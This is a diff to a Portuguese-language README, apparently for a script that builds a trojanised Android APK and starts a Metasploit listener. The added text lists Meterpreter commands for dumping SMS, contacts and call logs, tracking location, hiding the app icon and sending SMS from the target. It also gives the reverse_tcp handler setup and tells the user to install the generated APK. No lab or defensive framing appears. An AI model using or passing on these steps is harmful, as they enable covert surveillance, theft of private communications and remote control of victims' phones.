@@ -62,4 +62,64 @@ Por fim, o script inicia o listener do Meterpreter, configurando a porta de escu
 
 ## Contribuições
 
-Sinta-se à vontade para contribuir com melhorias ou correções. Caso encontre problemas, por favor, abra uma issue no repositório.
+## Sinta-se à vontade para contribuir com melhorias ou correções. Caso encontre problemas, por favor, abra uma issue no repositório.
+
+
+Comandos específicos para Android
+activity_start: Inicia uma atividade Android a partir de uma string Uri.
+check_root: Verifica se o dispositivo Android é root.
+dump_calllog: Obtém o histórico de chamadas.
+dump_contacts: Obtém a lista de contatos.
+dump_sms: Obtém as mensagens SMS.
+geolocate: Obtém a localização atual usando geolocalização.
+hide_app_icon: Oculta o ícone do aplicativo do lançador.
+interval_collect: Gerencia a coleta de dados em intervalos.
+send_sms: Envia SMS do dispositivo alvo.
+sqlite_query: Consulta um banco de dados SQLite no armazenamento.
+wakelock: Habilita ou desabilita o Wakelock.
+wlan_geolocate: Obtém a localização usando informações de WLAN.
+
+
+## Iniciar coleta de Wi-Fi:
+
+
+Copiar código
+interval_collect -a start -c wifi
+Pausar a coleta de localização geográfica:
+
+
+Copiar código
+interval_collect -a pause -c geo
+Exibir os dados coletados de torres de celular:
+
+
+Copiar código
+interval_collect -a dump -c cell
+
+
+## (depois que instala o apk use sempre esse) Se você quiser iniciar o listener manualmente, execute o seguinte comando no terminal:
+
+
+msfconsole
+E, após carregar o Metasploit, configure o listener com o comando:
+
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST [IP_LOCAL]
+set LPORT [PORTA]
+exploit
+Troque [IP_LOCAL] pelo seu IP local e [PORTA] pela porta que você configurou (como a porta 4444).
+
+## se querer gerar de novo o apk apague os arquivos como pastas e apk's gerado
+
+use: 
+       sudo rm -rf Brunao_kyti
+       sudo rm -rf brunao_kyti
+       sudo rm -rf brunao_kyti.apk
+       sudo rm -rf brunao_kyti_final.apk
+       sudo rm -rf brunao_kyti_signed.apk
+
+
+## depois de gerar o apk instaler o brunao_kyti_final.apk, guarde e use o msconsole. 
+
